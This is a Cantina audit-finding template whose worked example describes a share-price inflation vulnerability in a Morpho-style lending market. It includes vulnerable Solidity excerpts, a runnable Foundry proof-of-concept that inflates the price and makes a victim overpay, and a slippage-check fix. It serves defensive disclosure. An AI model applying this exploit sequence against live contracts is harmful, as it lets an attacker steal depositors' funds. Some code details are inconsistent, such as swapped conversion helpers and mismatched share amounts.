# Cantina Audit Finding Template

Copy this template when submitting findings to Cantina competitions. Cantina emphasizes clear communication and detailed explanations.

---

## [DESCRIPTIVE TITLE - e.g., `Supply share price can be inflated, causing users to lose funds when using shares parameter`]

### Description
The `supply` and `withdraw` functions can increase the supply share price (`totalSupplyAssets / totalSupplyShares`). If a depositor uses the `shares` parameter in `supply` to specify how many assets they want to supply, they can be tricked into supplying more assets than they wanted. It's easy to inflate the supply share price by 100x through a combination of a single supply of 100 assets and then withdrawing all shares without receiving any assets in return.

#### What is the issue?
The share calculation in `supply()` allows an attacker to inflate the share price, causing subsequent users who specify shares to deposit more assets than expected while receiving fewer shares.


#### Where is the vulnerable code?
**File:** `src/morpho/Market.sol`
**Lines:** 142-156

```solidity
function supply(MarketParams memory market, uint256 assets, uint256 shares, ...)
    external
    returns (uint256 assetsSupplied, uint256 sharesReceived)
{
    // @audit-issue: No slippage protection when shares != 0
    if (shares == 0) shares = sharesToAssets(assets, ...);
    else assets = assetsToShares(shares, ...);  // Vulnerable to price manipulation

    markets[id].totalSupplyAssets += assets;
    markets[id].totalSupplyShares += shares;
    // ...
}

function withdraw(MarketParams memory market, uint256 assets, uint256 shares, ...)
    external
    returns (uint256 assetsWithdrawn, uint256 sharesBurned)
{
    if (shares == 0) shares = assetsToShares(assets, ...);
    else assets = sharesToAssets(shares, ...);  // Can return 0

    uint256 assets = shares.toAssetsUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);
    // assets can be 0 here, allowing burning shares without withdrawing assets
}
```

### Impact
An attacker can:
1. Inflate the share price by 100x or more
2. Wait for a victim to deposit using the `shares` parameter
3. The victim deposits significantly more assets than intended
4. Attacker withdraws their shares at the inflated price, stealing the difference

**Worst case:** Loss of all victim deposits. Attack cost is minimal (single deposit + withdrawal sequence).

### Proof of Concept

```solidity
function testSupplyInflationAttack() public {
    vm.startPrank(SUPPLIER);
    loanToken.setBalance(SUPPLIER, 1 * 1e18);

    // Step 1: Attacker inflates share price by 100x
    morpho.supply(marketParams, 99, 0, SUPPLIER, "");  // Deposit 99 assets

    // Step 2: Attacker inflates by withdrawing all shares without receiving assets
    uint256 withdrawals = 0;
    for (;; withdrawals++) {
        (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
        uint256 shares = (totalSupplyShares + 1e6).mulDivUp(1, totalSupplyAssets + 1) - 1;

        if (shares > totalSupplyShares) {
            shares = totalSupplyShares;
        }
        if (shares == 0) break;

        morpho.withdraw(marketParams, 0, shares, SUPPLIER, SUPPLIER);
    }

    (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
    console2.log("withdrawals", withdrawals);
    console2.log("totalSupplyAssets", totalSupplyAssets);
    console2.log("final share price %sx", (totalSupplyAssets + 1) * 1e6 / (totalSupplyShares + 1e6));

    // Step 3: Victim tries to deposit using shares parameter
    // Without inflation: 1 share = 1 asset
    // With inflation: 1 share = 100 assets
    vm.stopPrank();

    vm.startPrank(VICTIM);
    loanToken.setBalance(VICTIM, 1000 * 1e18);

    // Victim expects to deposit 1e18 assets (specifying 1e18 shares)
    // But actually deposits 100x more due to inflated share price
    (uint256 assetsDeposited,) = morpho.supply(marketParams, 0, 1 * 1e6, VICTIM, "");

    // Verify: Victim pulled in ~100 assets instead of expected 1
    assertGt(assetsDeposited, 50 * 1e18);  // Much more than expected
}
```

**To reproduce:**
1. Place test in `test/MorphoInflation.t.sol`
2. Run: `forge test --match-test testSupplyInflationAttack -vvvv`

### Remediation

**Primary Fix:** Suppliers should use the `assets` parameter instead of `shares` whenever possible. Update documentation to warn about the `shares` parameter.

**Code Fix:** Add a `maxAssets` slippage protection parameter:

```solidity
function supply(
    MarketParams memory market,
    uint256 assets,
    uint256 shares,
    address receiver,
    bytes calldata data,
    uint256 maxAssets  // NEW: Slippage protection
) external returns (uint256 assetsSupplied, uint256 sharesReceived) {
    if (shares == 0) {
        shares = sharesToAssets(assets, ...);
    } else {
        assets = assetsToShares(shares, ...);
        require(assets <= maxAssets, "Max assets exceeded");  // NEW: Slippage check
    }
    // ...
}
```

**Additional Recommendations:**
1. Add event logging for share price changes
2. Consider implementing a minimum liquidity requirement
3. Add circuit breaker if share price changes beyond threshold in single block

---

## Cantina Submission Checklist

- [ ] Description clearly explains WHAT, WHY, and WHERE
- [ ] Impact section describes attacker capabilities and worst-case loss
- [ ] Proof of Concept is a complete, runnable test
- [ ] Remediation provides specific code-level fixes
- [ ] Code references include file path and line numbers
- [ ] Test case includes setup, exploitation, and verification steps
